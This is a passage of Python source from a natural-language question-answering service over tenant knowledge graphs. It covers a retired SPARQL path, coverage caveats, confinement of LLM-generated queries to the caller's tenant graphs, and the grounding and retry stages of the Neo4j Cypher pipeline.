        # than quietly POSTing at a dead endpoint. The generator helpers
        # (``_generate_sparql`` etc.) remain for unit tests that call them
        # directly and for residual inventory — see
        # docs/onta-534-neptune-purge-residual.md.
        if neo4j_ask_enabled(explicit=use_cypher):
            return await self._ask_cypher(
                question,
                graph_uri=graph_uri,
                data_graph=data_graph,
                exclude_questions=exclude_questions,
                layer_graph_uris=layer_graph_uris,
                run_manifest=run_manifest,
            )

        raise SparqlAskPathRetired(
            "NL→SPARQL /ask was retired with the Neptune cutover (ONTA-534). "
            "Neo4j Cypher is the only product query language; pass use_cypher=True "
            "or omit it (default). explicit use_cypher=False is no longer supported."
        )

    # ------------------------------------------------------- KG coverage caveat

    async def _kg_coverage_caveat(
        self,
        sparql: str,
        ontology: str,
        data_graph: str,
        ontology_graph: str,
        layer_graph_uris: list[str] | None,
        declared_names: list[str] | None,
        active_types: set[str] | None,
        ontology_source: str,
        timing: dict,
        query_params: dict | None = None,
    ) -> str:
        """One sentence when the NAMED KG holds none of the types the query read.

        ONTA-454. The generated dataset is a union of the KG graph, the tenant
        base graph and the Global layers, so a question asked about ONE knowledge
        graph can be answered entirely out of the others and read as though it
        came from the named one. See ``nlp/kg_coverage.py`` for why a narrower
        dataset is not available as a fix and why a refusal would be wrong.

        Returns ``""`` — silently, on every degenerate input — when:

        * no KG was named (``data_graph`` is the tenant graph itself, the
          ``kg_name``-less workspace whose data legitimately IS the base graph);
        * nothing is marked ``[no instances]`` for this KG, so there is no signal;
        * the executed query names no type URI, so there is nothing to check; or
        * every type it named does have instances here.

        COST. The common path adds ZERO round-trips: it compares two values the
        caller already holds (the ontology summary the planner saw, whose
        ``[no instances]`` marks are already resolved per-KG, and the query that
        ran). ONE bounded probe fires only when a caveat is otherwise about to be
        emitted, to settle subclass closure — ``[no instances]`` is a DIRECT
        ``rdf:type`` fact while the query walks ``rdf:type/rdfs:subClassOf*``, so
        without it a KG holding only ``Facility`` rows would be wrongly told it
        has no ``Organization`` data. That probe can only SUPPRESS a caveat, so a
        failure degrades to the direct-type verdict the planner was already shown,
        never to a fabricated one.

        Best-effort throughout: any unexpected failure returns ``""`` rather than
        breaking an answer that is otherwise ready to return.
        """
        try:
            if not data_graph or data_graph == ontology_graph:
                return ""
            from infona_client.graph.kg_status import other_graphs_hold_instances
            from infona_client.graph.queries import parse_kg_graph_uri
            from infona_client.nlp.kg_coverage import (
                MAX_UNCOVERED_TYPES,
                coverage_caveat,
                empty_types_for_kg,
                referenced_types,
                undetermined_caveat,
                unscoped_caveat,
                uncovered_types,
            )

            scope = parse_kg_graph_uri(data_graph)
            if not scope:
                return ""
            tenant_id, kg_name = scope
            # EVERY non-KG graph the answer query read, which is precisely the set
            # of extra FROM clauses `add_layer_from_clauses` spliced in. Asking
            # only about the tenant base graph would miss the shared Global
            # layers, which demonstrably hold instance data (see
            # `other_graphs_hold_instances`).
            other_graphs = [
                g
                for g in (list(layer_graph_uris) if layer_graph_uris else [ontology_graph])
                if g and g != data_graph
            ]

            # SIGNAL B, the type-UNANCHORED query. `?s rdf:type ?type` with an
            # unbound type constrains nothing, so it reads the whole union and no
            # type-based signal can speak about it. Measured on production
            # 2026-08-03: "how many rows of data are there in total?" against a
            # KG of 8 subjects answered 19582. Only worth saying when the union
            # really does hold data outside the named graph, which is one
            # positive-cached O(1) ASK (and which fails toward silence).
            referenced = referenced_types(sparql)
            # Cypher templates rarely embed type IRIs; fall back to gen params.
            if not referenced and query_params:
                from infona_client.graph.iri import IRI_BASE as _IRI

                synthetic: dict[str, list[str]] = {}
                for tn in query_params.get("type_names") or []:
                    if isinstance(tn, str) and tn.strip():
                        synthetic[tn.strip()] = [f"{_IRI}/types/{tn.strip()}"]
                pt = query_params.get("primary_type")
                if isinstance(pt, str) and pt.strip():
                    synthetic[pt.strip()] = [f"{_IRI}/types/{pt.strip()}"]
                referenced = synthetic
            if not referenced:
                if not await other_graphs_hold_instances(
                    self.neptune, tenant_id, other_graphs
                ):
                    return ""
                timing["kg_coverage_unscoped_query"] = 1.0
                logger.info("kg_coverage_unscoped_query", kg_name=kg_name)
                return unscoped_caveat(kg_name)

            # SIGNAL A, the type-anchored query.
            empty_in_kg = empty_types_for_kg(
                ontology, declared_names=declared_names, active_types=active_types
            )
            if not empty_in_kg:
                # No marks. Usually that means every declared type IS populated
                # here, which is the honest silent case. But on the SEMANTIC path
                # `ontology_embeddings` marks nothing at all when the ONTA-411
                # active-type probe failed, and that same failure un-scopes
                # retrieval, so the subset may be a SIBLING KG's schema. Absence of
                # marks then means "not measured", not "all covered", and silence
                # would hide exactly the leak the WARNING log already reports.
                if ontology_source == "semantic" and active_types is None:
                    if not await other_graphs_hold_instances(
                        self.neptune, tenant_id, other_graphs
                    ):
                        return ""
                    timing["kg_coverage_undetermined"] = 1.0
                    logger.info("kg_coverage_undetermined", kg_name=kg_name)
                    return undetermined_caveat(kg_name)
                return ""
            flagged, all_types = uncovered_types(referenced, empty_in_kg)
            if not flagged:
                return ""
            # Cap BEFORE probing, so the sentence only ever names types the
            # confirmation probe actually cleared. Sorted so the choice is
            # deterministic rather than regex-match order.
            flagged = dict(sorted(flagged.items())[:MAX_UNCOVERED_TYPES])
            probed = set(flagged)

            present = await self._types_present_in_kg(
                data_graph, ontology_graph, layer_graph_uris, flagged
            )
            flagged = {n: u for n, u in flagged.items() if n not in present}
            if not flagged:
                return ""
            # `all_types` was computed from the "[no instances]" MARKS, before the
            # probe had a chance to disagree with them. If the probe CLEARED any
            # type, the marks were wrong about at least one, and the strong
            # sentence ("the only type this query reads ... not an answer about
            # this graph") becomes a false claim about a graph the probe just
            # proved does hold one of the query's types. Demote to the partial
            # wording. Truncation by the cap alone is NOT a demotion: those types
            # are still uncovered, they are merely not all listed.
            if probed - set(flagged):
                all_types = False

            timing["kg_coverage_uncovered_types"] = ", ".join(sorted(flagged))
            logger.info(
                "kg_coverage_caveat",
                kg_name=kg_name,
                uncovered=sorted(flagged),
                all_referenced_types=all_types,
            )
            return coverage_caveat(kg_name, list(flagged), all_types=all_types)
        except Exception:  # noqa: BLE001 - an advisory note must never fail an answer
            logger.warning("kg_coverage_caveat_failed", exc_info=True)
            return ""

    async def _types_present_in_kg(
        self,
        data_graph: str,
        ontology_graph: str,
        layer_graph_uris: list[str] | None,
        flagged: dict[str, list[str]],
    ) -> set[str]:
        """Names among ``flagged`` that DO have an instance in ``data_graph``.

        Subclass-aware, which is the whole reason it exists (see
        :meth:`_kg_coverage_caveat`). Returns an empty set on any failure, i.e.
        suppresses nothing, leaving the direct-``rdf:type`` verdict the ontology
        summary already carried. The failure is logged at WARNING because the
        cost of silence here is a caveat that could be wrong, and its only other
        trace would be a `timing` key in a response body.
        """
        from infona_client.graph.layers import type_name_from_uri
        from infona_client.nlp.kg_coverage import kg_subtype_presence_query

        probe_uris = [uri for uris in flagged.values() for uri in uris]
        if not probe_uris:
            return set()
        ontology_graphs = list(layer_graph_uris) if layer_graph_uris else [ontology_graph]
        present: set[str] = set()
        try:
            raw = await self.neptune.query(
                kg_subtype_presence_query(data_graph, ontology_graphs, probe_uris)
            )
            _, rows = parse_sparql_results(raw)
        except Exception:
            logger.warning(
                "kg_coverage_subtype_probe_failed",
                instance_graph=data_graph,
                exc_info=True,
            )
            return set()
        for row in rows:
            name = type_name_from_uri(row.get("type", ""))
            if name:
                present.add(name)
        return present

    # ------------------------------------------------ generated-query confinement

    @staticmethod
    def _confine_generated(
        sparql: str, data_graph: str, layer_graph_uris: list[str] | None = None
    ) -> str:
        """Confine LLM-generated SPARQL to this request's graphs (ONTA-424).

        The single choke point every generated query passes through before it
        reaches Neptune. Returns the query to run, which is either ``sparql``
        unchanged or a repaired copy carrying ``FROM <data_graph>``; raises
        :class:`CrossTenantQueryError` when the generated text reaches outside
        the request's scope.

        The tenant is derived from ``data_graph`` rather than passed in, and that
        is deliberate. ``data_graph`` is resolved by the route from the
        AUTHENTICATED tenant (``/ask`` and the agent's ``QueryCapability`` both
        build it with ``kg_graph_uri(tenant.tenant_id, ...)``), so it is already
        the trusted boundary; deriving it means a future caller of ``ask()``
        cannot forget to thread a tenant and silently lose the guard. A
        ``data_graph`` outside the platform namespace (a self-hosted store) yields
        no tenant, and confinement then falls back to the graphs the request
        itself named, which is strictly tighter than tenant ownership.
        """
        return confine_generated_query(
            sparql,
            default_graphs=[data_graph],
            tenant_id=tenant_of_graph(data_graph),
            allowed_graphs=layer_graph_uris or (),
        )

    # ------------------------------------------------ NL → Cypher (E6 foundation)

    async def _ask_cypher(
        self,
        question: str,
        *,
        graph_uri: str,
        data_graph: str,
        exclude_questions: list[str] | None = None,
        layer_graph_uris: list[str] | None = None,
        run_manifest: "RunManifest | RunCoverage | None" = None,
    ) -> NLResult:
        """Neo4j /ask path with SPARQL-parity recovery mechanisms (ONTA-530).

        **Product rule:** user-facing NL→Cypher generation always uses the LLM
        (:meth:`_try_llm_cypher`). Deterministic fixtures
        (``try_deterministic_cypher``) are **not** consulted on this path — they
        remain for unit tests of template builders and non-ask helpers such as
        :meth:`select_entity_uris` (internal URI resolution only).

        Execution is always via GraphStore with session-forced ``tenant_id`` /
        ``kg`` — never trust model-supplied scope values.

        Ports from the SPARQL branch (same *decision* layers, Cypher execution):
        semantic ontology retrieval, alias map, 3-attempt retry budget, length-
        truncation recovery, zero-row ontology escalation + honest-empty guard,
        unbound-projection honesty, KG coverage caveat, A9 run_manifest, and
        token-usage ledger. Layer URIs feed ontology fetch + coverage probes
        (subclass closure on Neo4j is the catalog Class hierarchy, not SPARQL
        FROM widening).

        Cypher text is returned in :attr:`NLResult.sparql` for wire
        compatibility with existing clients (field name historical).
        """
        t0 = time.time()
        timing: dict[str, float | str] = {
            "model": f"{self._query_provider}:{self._query_model}",
            "query_language": "cypher",
            "graph_backend": "neo4j",
        }
        token_ledger = TokenUsageLedger()

        parsed = parse_kg_graph_uri(data_graph)
        if not parsed:
            tid = tenant_of_graph(data_graph) or ""
            kg = data_graph.rstrip("/").rsplit("/", 1)[-1] if data_graph else ""
            if not tid or not kg or kg == tid:
                return NLResult(
                    answer=(
                        "Could not answer: Neo4j /ask requires a per-KG instance "
                        "graph URI (…/graphs/{tenant}/kg/{kg})."
                    ),
                    sparql="",
                    explanation="",
                    timing={**timing, "total_ms": round((time.time() - t0) * 1000, 1)},
                    token_usage=token_ledger.to_list(),
                )
            tenant_id, kg_name = tid, kg
        else:
            tenant_id, kg_name = parsed

        store = self._graph_store
        if store is None:
            try:
                from infona_client.graph.store import get_graph_store

                store = get_graph_store()
            except Exception:
                store = None

        # ---- Ontology context (populated GraphStore → semantic → sparql) ----
        # Planning truth is instance-populated schema for THIS KG (declared-empty
        # edges demoted). Semantic retrieval ranks extra declared types when the
        # catalog is large, and is the fallback text when GraphStore has no rows.
        # It must not hide a type that has instances in THIS kg.
        ontology = ""
        type_names: list[str] = []
        ontology_source = "full"
        kg_active_types: set[str] | None = None
        kg_declared_names: list[str] | None = None
        full_ontology_loaded = False
        semantic_text: str | None = None
        semantic_type_names: list[str] | None = None

        embedding_svc = get_embedding_service()
        if embedding_svc:
            try:
                from infona_client.config import settings

                try:
                    declared = await embedding_svc.type_names(graph_uri)
                    active_types = (
                        await self._active_types(
                            data_graph, graph_uri, declared_names=declared
                        )
                        if declared
                        else None
                    )
                    kg_declared_names = list(declared) if declared else None
                    kg_active_types = active_types
                except Exception:
                    logger.warning(
                        "active_types_probe_failed",
                        instance_graph=data_graph,
                        exc_info=True,
                    )
                    active_types = None
                    kg_active_types = None
                    kg_declared_names = None
                semantic = await embedding_svc.retrieve(
                    graph_uri,
                    question,
                    top_k=settings.embeddings_top_k,
                    active_types=active_types,
                )
                if semantic:
                    from infona_client.nlp.cypher_generate import (
                        extract_type_names_from_ontology,
                    )

                    semantic_text = semantic
                    semantic_type_names = extract_type_names_from_ontology(semantic)
                    timing["ontology_scope"] = (
                        "kg" if active_types is not None else "tenant"
                    )
                    timing["semantic_type_count"] = float(
                        len(semantic_type_names or [])
                    )
            except Exception:
                pass

        # Semantic top-K is ranking / extra context, not a license to hide
        # THIS-KG populated types. Sibling-ingest leftovers (empty
        # BenchIdentifier / KitIdentifier) can outrank Product; if we pass
        # those names as a hard GraphStore filter, Product is dropped from
        # the planning prompt and the model invents prop_key=price.
        populated_type_names: list[str] = (
            sorted(kg_active_types) if kg_active_types else []
        )
        from infona_client.nlp.planning_schema import resolve_planning_type_scope

        plan_scope = resolve_planning_type_scope(
            semantic_names=semantic_type_names,
            populated_names=populated_type_names,
        )
        scope_type_names = (
            list(plan_scope.type_names)
            if plan_scope.type_names is not None
            else None
        )
        force_populated = list(plan_scope.force_include) or None

        if store is not None:
            try:
                ontology, type_names = await ontology_from_graph_store(
                    store,
                    tenant_id=tenant_id,
                    kg=kg_name,
                    prefer_populated=True,
                    type_names=scope_type_names,
                    force_include=force_populated,
                )
                if ontology:
                    ontology_source = (
                        "graph_store_populated"
                        if semantic_type_names
                        else "graph_store_catalog"
                    )
                    timing["ontology_source"] = ontology_source
                    full_ontology_loaded = not bool(semantic_type_names)
            except Exception:
                logger.debug("cypher_ask_catalog_ontology_failed", exc_info=True)
                ontology = ""

        # Semantic text is the fallback when GraphStore has no catalog rows
        # (embeddings exist but catalog empty / cold). Prefer populated store
        # when both are present so dead declared edges do not win.
        if not ontology and semantic_text:
            ontology = semantic_text
            ontology_source = "semantic"
            timing["ontology_source"] = "semantic"
            type_names = list(semantic_type_names or [])

        if not ontology:
            try:
                fetched = await self._fetch_ontology(
                    graph_uri, data_graph, layer_graph_uris=layer_graph_uris
                )
                if fetched in (ONTOLOGY_FETCH_ERROR, ONTOLOGY_EMPTY):
                    ontology = ""
                elif fetched:
                    ontology = fetched
                    ontology_source = "full"
                    timing["ontology_source"] = "full"
                    full_ontology_loaded = True
            except Exception:
                logger.debug("cypher_ask_ontology_fetch_failed", exc_info=True)
                ontology = ""

        if ontology_source in (
            "full",
            "graph_store_catalog",
            "graph_store_populated",
        ):
            if ontology_source != "graph_store_populated" or not semantic_type_names:
                full_ontology_loaded = True
        timing["ontology_fetch_ms"] = round((time.time() - t0) * 1000, 1)
        # Visible RCA: which types the prompt saw vs retrieve vs THIS-KG live.
        timing["ontology_type_names"] = ", ".join(type_names or [])[:400]
        timing["semantic_type_names"] = ", ".join(semantic_type_names or [])[:400]
        timing["populated_type_names"] = ", ".join(populated_type_names)[:400]
        if plan_scope.ignored_semantic:
            timing["ontology_semantic_ignored"] = 1.0

        # Schema-valid allowlist: prefer live GraphStore catalog + instance-
        # populated leaves for THIS tenant+kg. Ontology text is fallback only
        # when the store probe fails (sparse text must not reject real
        # unit_cost / located_at / has_* inventory that vis+export show).
        schema_inventory = None
        if store is not None and tenant_id and kg_name:
            try:
                from infona_client.nlp.schema_valid_cypher import (
                    inventory_from_graph_store,
                )

                schema_inventory = await inventory_from_graph_store(
                    store,
                    tenant_id=tenant_id,
                    kg=kg_name,
                    # Full KG inventory — not semantic top-K alone — so
                    # schema-valid does not thrash on out-of-window leaves.
                    type_names=None,
                )
                if schema_inventory is not None and not schema_inventory.empty:
                    timing["schema_valid_inventory_source"] = "graph_store"
                    timing["schema_valid_inventory_rels"] = float(
                        len(schema_inventory.relationship_leaves)
                    )
                    timing["schema_valid_inventory_attrs"] = float(
                        len(schema_inventory.attribute_leaves)
                    )
            except Exception:
                logger.debug(
                    "schema_valid_inventory_probe_failed",
                    exc_info=True,
                )
                schema_inventory = None
        if schema_inventory is None or schema_inventory.empty:
            if ontology:
                from infona_client.nlp.schema_valid_cypher import (
                    OntologyLeafInventory,
                )

                schema_inventory = OntologyLeafInventory.from_ontology(ontology)
                timing["schema_valid_inventory_source"] = "ontology_text"
            else:
                schema_inventory = None
                timing["schema_valid_inventory_source"] = "empty"

        # Attribute-alias map (ADR 0002 §7) — leaf renames for Cypher property keys.
        alias_map: dict[str, str] = {}
        if self._aliases_enabled:
            alias_map = await self._fetch_alias_map(graph_uri)

        # Cypher-mode examples only.
        examples_text = ""
        try:
            from infona_client.nlp.example_bank import (
                format_examples_for_prompt,
                get_example_bank,
            )

            bank = get_example_bank()
            if bank and bank._examples:
                examples = await bank.retrieve(
                    question=question,
                    ontology_context=ontology,
                    exclude_questions=exclude_questions or [],
                    kg_name=kg_name,
                    top_k=3,
                    language="cypher",
                )
                if examples:
                    examples_text = format_examples_for_prompt(
                        examples, language="cypher"
                    )
                    cypher_n = sum(
                        1
                        for ex in examples
                        if (getattr(ex, "cypher", None) or "").strip()
                    )
                    timing["examples_retrieved"] = float(cypher_n)
                    if not examples_text:
                        examples_text = ""
        except Exception:
            pass

        # Ontology-subgraph + numeric grounding (planning layer) — structured
        # prompt context only. Never short-circuits the LLM (always-LLM rule).
        grounding_text = ""
        # Unique dim-registry binds for post-gen coverage (leaf+value required).
        # Initialized outside the try so coverage gates always see a defined list.
        dim_binds: list = []
        # Live inventory for zero-instance / pollution-type coverage gate.
        build_ctx = None
        populated_types_for_coverage: tuple[str, ...] | None = None
        # Money leaf hard-bind (probe / numeric plan → params after gen).
        money_leaf_bound: str | None = None
        money_cue_bound: str | None = None
        try:
            from infona_client.nlp.ontology_subgraph_match import (
                format_grounding_for_prompt,
                ground_ask_plan,
            )
            from infona_client.nlp.numeric_plan_grounding import (
                format_numeric_grounding_for_prompt,
                ground_numeric_plan,
                merge_grounding_texts,
            )
            from infona_client.nlp.ontology_mention_index import (
                get_process_mention_index,
                get_resolve_context,
                lookup_query_embedding,
            )

            names_for_ground = type_names or None
            if not names_for_ground and ontology:
                from infona_client.nlp.cypher_generate import (
                    extract_type_names_from_ontology,
                )

                names_for_ground = extract_type_names_from_ontology(ontology) or None
            # Live GraphStore inventory first — scopes money leaf ranking to
            # types populated in THIS KG (anti tuition_usd pollution).
            build_text = ""
            build_ctx = None
            populated_for_numeric: list[str] | None = None
            try:
                from infona_client.nlp.query_build import (
                    collect_query_build_context,
                    format_query_build_for_prompt,
                )

                build_ctx = await collect_query_build_context(
                    store,
                    tenant_id=tenant_id,
                    kg=kg_name,
                    question=question,
                )
                build_text = format_query_build_for_prompt(build_ctx)
                if build_ctx is not None and build_ctx.types:
                    timing["query_build"] = "present"
                    timing["query_build_types"] = float(
                        len(build_ctx.populated_type_names)
                    )
                    if build_ctx.question_type_hits:
                        timing["query_build_type_hits"] = ", ".join(
                            build_ctx.question_type_hits
                        )[:200]
                    # Vague “how many records?” + ≥2 live types → ask, don’t guess.
                    try:
                        from infona_client.nlp.ask_process_log import log_ask_event
                        from infona_client.nlp.query_ambiguity import (
                            ambiguous_count_needs_clarify,
                            format_type_count_clarification,
                        )

                        if ambiguous_count_needs_clarify(
                            question, build_ctx.types
                        ):
                            clarify = format_type_count_clarification(
                                build_ctx.types
                            )
                            timing["query_ambiguity_clarify"] = 1.0
                            timing["query_confidence"] = "low"
                            timing["query_confidence_reason"] = (
                                "ambiguous count: multiple populated types, "
                                "question did not name one"
                            )
                            log_ask_event(
                                "ask_clarify",
                                question=question,
                                tenant_id=tenant_id,
                                kg=kg_name,
                                reason="ambiguous_count",
                                populated_types=list(
                                    build_ctx.populated_type_names
                                )[:20],
                                answer=clarify,
                            )
                            timing.update(token_ledger.totals_for_timing())
                            return NLResult(
                                answer=clarify,
                                sparql="",
                                explanation="clarification: ambiguous count",
                                ontology=ontology,
                                timing={
                                    **timing,
                                    "total_ms": round(
                                        (time.time() - t0) * 1000, 1
                                    ),
                                    "attempts": 0,
                                },
                                token_usage=token_ledger.to_list(),
                                query_confidence="low",
                                query_confidence_reason=str(
                                    timing["query_confidence_reason"]
                                ),
                                clarification_prompt=clarify,
                            )
                    except Exception:
                        logger.debug(
                            "query_ambiguity_check_failed", exc_info=True
                        )
                    if build_ctx.populated_type_names:
                        populated_for_numeric = list(build_ctx.populated_type_names)
                        # Zero-instance pollution gate (#local high-conf empty).
                        populated_types_for_coverage = build_ctx.populated_type_names
            except Exception:
                logger.debug("query_build_context_failed", exc_info=True)
                build_text = ""
                build_ctx = None
            if not populated_for_numeric and kg_active_types:
                populated_for_numeric = sorted(kg_active_types)
            if populated_types_for_coverage is None and populated_for_numeric:
                populated_types_for_coverage = tuple(populated_for_numeric)
            # Optional ONTA-537 mention index + precomputed query embedding
            # when the ask path already has them (best-effort; hermetic without).
            _rctx = get_resolve_context()
            _midx = (
                _rctx.mention_index
                if _rctx is not None and _rctx.mention_index is not None
                else get_process_mention_index()
            )
            _qemb = lookup_query_embedding(question, _rctx)
            grounded = ground_ask_plan(
                question,
                ontology,
                type_names=names_for_ground,
                mention_index=_midx,
                query_embedding=_qemb,
            )
            loc_text = format_grounding_for_prompt(grounded)
            if grounded is not None:
                timing["grounding_confidence"] = grounded.confidence
                if grounded.template:
                    timing["grounding_template"] = grounded.template
                if grounded.path is not None:
                    timing["grounding_path"] = grounded.path.describe()
            num_plan = ground_numeric_plan(
                question,
                ontology,
                type_names=names_for_ground,
                mention_index=_midx,
                query_embedding=_qemb,
                populated_types=populated_for_numeric,
            )
            num_text = format_numeric_grounding_for_prompt(num_plan)
            if num_plan is not None:
                timing["numeric_grounding_confidence"] = num_plan.confidence
                if num_plan.prop_key:
                    timing["numeric_grounding_prop"] = num_plan.prop_key
                    money_leaf_bound = num_plan.prop_key
                if num_plan.template:
                    timing["numeric_grounding_template"] = num_plan.template
            # Low-cardinality dim registry: known enums + entity dims as
            # prompt context only (always-LLM; never short-circuits Cypher).
            # Structured unique binds also feed post-gen constraint coverage.
            dim_text = ""
            dim_registry_obj = None
            try:
                from infona_client.nlp.dim_registry import (
                    get_cached_dim_registry,
                    planning_dim_context,
                )

                dim_text, dim_binds = await planning_dim_context(
                    store,
                    tenant_id=tenant_id,
                    kg=kg_name,
                    question=question,
                )
                if dim_text:
                    timing["dim_registry"] = "present"
                if dim_binds:
                    timing["dim_binds_count"] = float(len(dim_binds))
                    timing["dim_bound_leaves"] = ", ".join(
                        getattr(b.dim, "leaf", "") for b in dim_binds
                    )[:200]
                try:
                    dim_registry_obj = get_cached_dim_registry(
                        tenant_id, kg_name
                    )
                except Exception:
                    dim_registry_obj = None
            except Exception:
                logger.debug("dim_registry_grounding_failed", exc_info=True)
                dim_text = ""
                dim_binds = []
            # Cheap read-only probe: dim values + money leaf candidates.
            # Merged into grounding before LLM (always-LLM; never short-circuit).
            probe_text = ""
            try:
                from infona_client.nlp.query_probe import build_probe_context

                probe_ctx = await build_probe_context(
                    store,
                    tenant_id=tenant_id,
                    kg=kg_name,
                    question=question,
                    ontology_summary=ontology or "",
                    registry=dim_registry_obj,
                    binds=dim_binds,
                    populated_types=populated_for_numeric,
                    build_ctx=build_ctx,
                    type_hint=(
                        build_ctx.question_type_hits[0]
                        if build_ctx is not None and build_ctx.question_type_hits
                        else None
                    ),
                )
                # Prefer money + dim-values sections (build already in build_text).
                probe_bits = [
                    probe_ctx.dim_values_text or "",
                    probe_ctx.money_text or "",
                ]
                probe_text = "\n\n".join(
                    b.strip() for b in probe_bits if b and b.strip()
                )
                if probe_text:
                    timing["query_probe"] = "present"
                if probe_ctx.extra.get("dim_values_present"):
                    timing["dim_values_present"] = 1.0
                if probe_ctx.money_candidates:
                    timing["money_leaf_candidates"] = float(
                        len(probe_ctx.money_candidates)
                    )
                    top = probe_ctx.money_candidates[0]
                    timing["money_leaf_top"] = top.leaf
                    if not money_leaf_bound:
                        money_leaf_bound = top.leaf
                    if probe_ctx.money_cue:
                        timing["money_cue"] = probe_ctx.money_cue
                        money_cue_bound = probe_ctx.money_cue
            except Exception:
                logger.debug("query_probe_failed", exc_info=True)
                probe_text = ""
            # Order: build inventory, dim values/money probe, subgraph,
            # numeric plan, dim registry binds.
            grounding_text = merge_grounding_texts(
                build_text, probe_text, loc_text, num_text, dim_text
            )
            # Structured ask process log (input + grounding spine).
            try:
                from infona_client.nlp.ask_process_log import log_ask_event

                log_ask_event(
                    "ask_grounding",
                    question=question,
                    tenant_id=tenant_id,
                    kg=kg_name,
                    ontology_source=ontology_source,
                    ontology=(ontology or "")[:4000],
                    grounding_text=(grounding_text or "")[:4000],
                    money_leaf_bound=money_leaf_bound,
                    money_cue=money_cue_bound,
                    dim_binds=[
                        f"{getattr(b, 'token', '')}->{getattr(getattr(b, 'dim', None), 'leaf', '')}"
                        for b in (dim_binds or [])[:12]
                    ],
                    populated_types=list(populated_types_for_coverage or [])[:20],
                    ontology_type_names=list(type_names or [])[:40],
                    semantic_type_names=list(semantic_type_names or [])[:40],
                    populated_type_names=list(populated_type_names)[:40],
                    query_model=f"{self._query_provider}:{self._query_model}",
                )
            except Exception:
                pass
        except Exception:
            logger.debug("ontology_subgraph_grounding_failed", exc_info=True)
            grounding_text = ""

        max_attempts = 3
        last_error = ""
        cypher = ""
        explanation = ""
        functions_needed: list[str] = []
        last_was_empty_query = False
        last_was_enum_filter_mismatch = False
        last_was_length_truncated = False
        length_recovery_stage = 0
        honest_empty_note = ""
        last_gen: dict = {}
        last_params: dict = {}

        from infona_client.graph.scope import GraphScope
        from infona_client.graph.store import GraphQueryError

        for attempt in range(max_attempts):
            honest_empty_note = ""
            try:
                gen_recovery: dict = {}
                if last_was_length_truncated:
                    length_recovery_stage += 1
                    if length_recovery_stage >= 2:
                        gen_recovery["prefer_fallback"] = True
                    else:
                        gen_recovery["max_completion_tokens"] = (
                            CEREBRAS_LENGTH_RECOVERY_TOKENS
                        )

                # Production NL→Cypher is always LLM (never fixture short-circuit).
                error_feedback = ""
                if last_was_empty_query:
                    if not full_ontology_loaded:
                        try:
                            full_ontology = await self._fetch_ontology(
                                graph_uri,
                                data_graph,
                                layer_graph_uris=layer_graph_uris,
                            )
                            if (
                                full_ontology
                                and full_ontology.strip()
                                and full_ontology
                                not in (ONTOLOGY_FETCH_ERROR, ONTOLOGY_EMPTY)
                            ):
                                ontology = full_ontology
                                ontology_source = "full"
                                timing["ontology_escalated_to_full_attempt"] = (
                                    attempt
                                )
                                # Re-ground after ontology escalation.
                                try:
                                    from infona_client.nlp.ontology_subgraph_match import (
                                        format_grounding_for_prompt,
                                        ground_ask_plan,
                                    )
                                    from infona_client.nlp.numeric_plan_grounding import (
                                        format_numeric_grounding_for_prompt,
                                        ground_numeric_plan,
                                        merge_grounding_texts,
                                    )
                                    from infona_client.nlp.cypher_generate import (
                                        extract_type_names_from_ontology,
                                    )

                                    names_esc = (
                                        extract_type_names_from_ontology(ontology)
                                        or None
                                    )
                                    from infona_client.nlp.ontology_mention_index import (
                                        get_process_mention_index,
                                        get_resolve_context,
                                        lookup_query_embedding,
                                    )

                                    _rctx_esc = get_resolve_context()
                                    _midx_esc = (
                                        _rctx_esc.mention_index
                                        if _rctx_esc is not None
                                        and _rctx_esc.mention_index is not None
                                        else get_process_mention_index()
                                    )
                                    _qemb_esc = lookup_query_embedding(
                                        question, _rctx_esc
                                    )
                                    grounded_esc = ground_ask_plan(
                                        question,
                                        ontology,
                                        type_names=names_esc,
                                        mention_index=_midx_esc,
                                        query_embedding=_qemb_esc,
                                    )
                                    pop_esc = (
                                        list(kg_active_types)
                                        if kg_active_types
                                        else None
                                    )
                                    num_esc = ground_numeric_plan(
                                        question,
                                        ontology,
                                        type_names=names_esc,
                                        mention_index=_midx_esc,
                                        query_embedding=_qemb_esc,
                                        populated_types=pop_esc,
                                    )
                                    dim_esc = ""
                                    try:
                                        from infona_client.nlp.dim_registry import (
                                            planning_dim_context,
                                        )

                                        dim_esc, dim_binds = await planning_dim_context(
                                            store,
                                            tenant_id=tenant_id,
                                            kg=kg_name,
                                            question=question,
                                        )
                                        if dim_binds:
                                            timing["dim_binds_count"] = float(
                                                len(dim_binds)
                                            )
                                            timing["dim_bound_leaves"] = ", ".join(
                                                getattr(b.dim, "leaf", "")
                                                for b in dim_binds
                                            )[:200]
                                    except Exception:
                                        dim_esc = ""
                                    build_esc = ""
                                    build_ctx_esc = None
                                    try:
                                        from infona_client.nlp.query_build import (
                                            collect_query_build_context,
                                            format_query_build_for_prompt,
                                        )

                                        build_ctx_esc = await collect_query_build_context(
                                            store,
                                            tenant_id=tenant_id,
                                            kg=kg_name,
                                            question=question,
                                        )
                                        build_esc = format_query_build_for_prompt(
                                            build_ctx_esc
                                        )
                                        if (
                                            build_ctx_esc is not None
                                            and build_ctx_esc.populated_type_names
                                        ):
                                            populated_types_for_coverage = (
                                                build_ctx_esc.populated_type_names
                                            )
                                    except Exception:
                                        build_esc = ""
                                    probe_esc = ""
                                    try:
                                        from infona_client.nlp.dim_registry import (
                                            get_cached_dim_registry,
                                        )
                                        from infona_client.nlp.query_probe import (
                                            build_probe_context,
                                        )

                                        reg_esc = get_cached_dim_registry(
                                            tenant_id, kg_name
                                        )
                                        pop_for_probe = (
                                            list(populated_types_for_coverage)
                                            if populated_types_for_coverage
                                            else pop_esc
                                        )
                                        pctx = await build_probe_context(
                                            store,
                                            tenant_id=tenant_id,
                                            kg=kg_name,
                                            question=question,
                                            ontology_summary=ontology or "",
                                            registry=reg_esc,
                                            binds=dim_binds,
                                            populated_types=pop_for_probe,
                                            build_ctx=build_ctx_esc,
                                        )
                                        probe_esc = "\n\n".join(
                                            b.strip()
                                            for b in (
                                                pctx.dim_values_text,
                                                pctx.money_text,
                                            )
                                            if b and b.strip()
                                        )
                                        if pctx.money_candidates:
                                            timing["money_leaf_candidates"] = float(
                                                len(pctx.money_candidates)
                                            )
                                    except Exception:
                                        probe_esc = ""
                                    grounding_text = merge_grounding_texts(
                                        build_esc,
                                        probe_esc,
                                        format_grounding_for_prompt(grounded_esc),
                                        format_numeric_grounding_for_prompt(num_esc),
                                        dim_esc,
                                    )
                                except Exception:
                                    pass
                        except Exception:
                            logger.debug(
                                "ontology_escalation_fetch_failed", exc_info=True
                            )
                        full_ontology_loaded = True
                    error_feedback = (
                        "The previous attempt returned an EMPTY or unparseable "
